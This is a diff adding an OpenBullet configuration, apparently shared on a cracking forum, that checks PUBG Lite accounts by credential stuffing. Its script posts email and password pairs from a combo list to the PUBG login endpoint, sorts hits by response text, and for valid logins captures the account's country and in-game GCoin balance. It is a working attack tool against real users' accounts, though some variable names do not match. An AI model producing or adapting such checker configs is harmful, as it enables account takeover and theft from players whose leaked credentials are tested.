@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "PUBG Lite",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-02T20:49:51.3548502+01:00",
+  "AdditionalInfo": "https://breakingin.to/profile/2735-seliax/",
+  "Author": "Seliax",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://litepc-session-service.pubg.com/auth/oidc?ui_locales=en" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Host: litepc-session-service.pubg.com" 
+
+#IOD PARSE "<SOURCE>" LR "oidc_client=" "'" -> VAR "IOD" 
+
+#CSRF PARSE "<SOURCE>" LR "_csrf: '" "'" -> VAR "CSRF" 
+
+#POST REQUEST POST "https://accounts.pubg.com/oidc/interaction/<IT>/login" 
+  CONTENT "_csrf=<CSRF>&oidc_client=<OID>&email=<USER>&password=<PASS>&faction=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Origin: https://accounts.pubg.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Host: accounts.pubg.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://accounts.pubg.com/oidc/interaction/<IT>" 
+
+#Tick_it KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "find an account with that email and password" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "You need to activate your email before logging in" 
+  KEYCHAIN Success OR 
+    KEY "<title>litePcAuthSuccess</title" 
+
+#GAC PARSE "<SOURCE>" LR "globalaccount." "', '" -> VAR "GAC" 
+
+#Encode64 FUNCTION Base64Encode "globalaccount.<GAC>" -> VAR "AUTHEEE" 
+
+#Auth PARSE "<SOURCE>" LR "window._launcher_object_.onLogin('" "'" -> VAR "AUTH" 
+
+#Country PARSE "<SOURCE>" LR "true, '" "', '" CreateEmpty=FALSE -> CAP "Country" 
+
+#GET2 REQUEST POST "https://d3cxkht3nugn83.cloudfront.net/api/UserService/gcoin" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "X-Authorization: <AUTH>.<AUTHEEE>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Referer: https://d3cxkht3nugn83.cloudfront.net/launcher.html" 
+  HEADER "Authorization: Bearer <AUTH>.<AUTHEEE>" 
+
+#Balance PARSE "<SOURCE>" LR "{\"result\":" "}" CreateEmpty=FALSE -> CAP "GCoin Balance" 
+
